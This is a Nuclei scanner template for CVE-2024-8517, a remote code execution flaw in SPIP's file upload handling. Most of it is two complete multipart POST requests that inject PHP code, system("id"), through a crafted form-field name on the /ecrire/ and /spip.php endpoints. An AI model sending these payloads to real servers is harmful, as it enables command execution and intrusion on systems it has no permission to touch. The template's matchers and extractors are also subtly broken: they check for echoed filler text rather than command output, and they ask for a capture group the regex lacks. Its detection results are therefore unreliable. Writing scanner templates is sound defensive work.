id: cve-2024-8517

info:
  name: Potential Remote Code Execution via File Upload in Vulnerable Application
  author: 3p1c0w3nd
  severity: high
  description: |
    This template checks for a potential remote code execution vulnerability through file upload functionality, similar to the PoC provided. The application may be vulnerable to executing commands injected into file names.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-8517
  tags: rce, file-upload, cve

requests:
  - method: POST
    path:
      - "{{BaseURL}}/ecrire/?exec=document_edit"
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------220087038315691589924077513546
      User-Agent: Nuclei
      Referer: "{{BaseURL}}/ecrire/?exec=document_edit&id_document=1&picker=1"
    body: |
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="a['. system(\"id\") . '][]"; filename="a"
      Content-Type: text/plain

      Contenu du deuxième fichier
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="exec"

      document_edit
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="formulaire_action"

      illustrer_document
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="formulaire_action_args"

      nOSkZLq2uy02wQeD3aQ/SL4PxQwIsSryUD4OXAGtlakEzXgrtT60rop4NW1rdalMqWmHmlHuO5hBQTCrds1ZE+Y4qY5aUyr3wKDeCMNm9wc=
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="formulaire_action_sign"

      d769b8bfcb61b98afeae8340a4b1340db01e2ea94f67f714411aabdc5e5ac555
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="id_document"

      1
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="bigup_retrouver_fichiers"

      1
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="methode_focus"

      upload
      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="fichier_upload[]"


      -----------------------------220087038315691589924077513546
      Content-Disposition: form-data; name="url"


      -----------------------------220087038315691589924077513546--
    matchers:
      - type: word
        words:
          - "Contenu du deuxième fichier"
        part: body
        condition: contains
    extractors:
      - type: regex
        name: extracted_file_content
        group: 1
        regex: 'Contenu du deuxième fichier'

  - method: POST
    path:
      - "{{BaseURL}}/spip.php"
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------27557867612533913872933463044
      User-Agent: Nuclei
      Referer: "{{BaseURL}}/spip.php?article1"
    body: |
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="formulaire_action"

      forum
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="bigup_retrouver_fichiers"

      1
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="a['. system(\"id\") . '][]"; filename="a"
      Content-Type: text/plain

      Contenu du fichier!
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="formulaire_action_args"

      sM/SRrCLa37g8rWHFPYfN8ICw2sgiYw3uyxS4jnTS3F9Z9h6lrpDZGulrRB12AM015WO4tg6/rl1cXl6sXpVCtkT45nRCZAqCZcvUIJJMqrav4k1R0kOG/64qgvm2S08c2rDTgYwm04PBbr7sQ
      -----------------------------27557867612533913872933463044--
    matchers:
      - type: word
        words:
          - "Contenu du fichier!"
        part: body
        condition: contains
    extractors:
      - type: regex
        name: extracted_file_content
        group: 1
        regex: 'Contenu du fichier!'

